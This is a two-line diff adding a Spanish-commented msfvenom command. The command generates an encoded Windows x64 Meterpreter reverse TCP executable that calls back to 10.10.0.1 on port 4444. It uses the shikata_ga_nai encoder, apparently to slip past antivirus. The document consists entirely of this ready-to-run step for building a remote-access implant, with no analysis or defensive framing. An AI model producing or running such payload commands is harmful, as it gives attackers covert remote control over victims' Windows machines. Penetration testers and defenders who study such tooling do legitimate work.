@@ -1,0 +1,2 @@
+# Generacion de Exploit Codificado (Windows 11)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -e x64/shikata_ga_nai -f exe -o encoded_payload.exe
